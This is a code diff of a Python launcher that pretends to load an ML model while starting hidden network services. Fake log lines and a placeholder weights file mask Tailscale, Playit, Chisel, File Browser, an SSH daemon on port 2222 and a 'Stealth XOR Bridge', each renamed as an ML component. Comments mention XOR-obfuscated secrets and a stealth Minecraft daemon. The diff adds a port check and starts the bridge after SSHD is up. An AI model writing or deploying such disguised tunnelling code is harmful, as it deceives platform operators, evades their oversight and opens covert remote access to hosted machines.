@@ -1,5 +1,6 @@
 import os
 import time
+import socket
 import subprocess
 import base64
 import threading
@@ -159,7 +160,7 @@ def main():
         subprocess.run(["truncate", "-s", "5G", "/home/user/pytorch_model.bin"])
 
     logger.info("Loading model weights into VRAM...")
-   # time.sleep(2)
+    time.sleep(2)
 
     # Start the background jitter thread
     threading.Thread(target=jitter_task, daemon=True).start()
@@ -171,7 +172,7 @@ def main():
     # 5. Start Tailscale (python-cache-manager)
     tailscale.start_daemon(ts_log)
 
-    #time.sleep(2)
+    time.sleep(2)
     logger.info("Warming up text-generation pipelines...")
 
     # Environment Variable Scrubbing (XOR Obfuscated Single Secrets & Standardized Fallbacks)
@@ -192,7 +193,7 @@ def main():
     # 6. Start File Browser (ai-metrics-collector)
     filebrowser.start(fb_log)
 
-    # 7. Start Playit (tensor-allocator)
+    # 7. Start Playit (tensor-allocator) - XOR bridge starts after SSHD is ready
     playit.start(tm_log)
 
     # 8. Start Chisel (cuda-mesh-bridge) on internal :6789, routed via nginx
@@ -207,7 +208,7 @@ def main():
     chisel_auth = ""
 
     # 9. Connect to Tailscale (py-cache-cli)
-    #time.sleep(5)
+    time.sleep(5)
     tailscale.connect(ts_log, full_token)
     full_token = ""
 
@@ -235,12 +236,25 @@ def main():
 
     # 11. Start SSHD on port 2222 (set in sshd_config at build time)
     subprocess.Popen("sudo /usr/sbin/sshd -D", shell=True, stdout=ts_log, stderr=ts_log)
+    # Wait for SSH port to be ready before starting Playit bridge
+    def wait_for_port(host, port, timeout=30):
+        start = time.time()
+        while time.time() - start < timeout:
+            try:
+                with socket.create_connection((host, port), timeout=2):
+                    return True
+            except OSError:
+                time.sleep(0.5)
+        return False
+    if not wait_for_port("127.0.0.1", 2222, timeout=30):
+        logger.error("SSH daemon did not become ready on port 2222")
+    else:
+        logger.info("SSH daemon ready on port 2222")
+        # 11.5 Start XOR bridge NOW that SSHD is confirmed up
+        playit.start_xor_bridge()
 
-    # 12. Start Stealth XOR Bridge on Port 25564
-    playit.start_xor_bridge()
-
-    # 13. Start Minecraft Stealth Daemon in Tmux
-    minecraft.start()
+    # 12. Start Minecraft Stealth Daemon in Tmux (server-port 25566; 25565 is XOR bridge)
+   # minecraft.start()
 
     logger.success("Model loaded successfully. Background services active.")
 
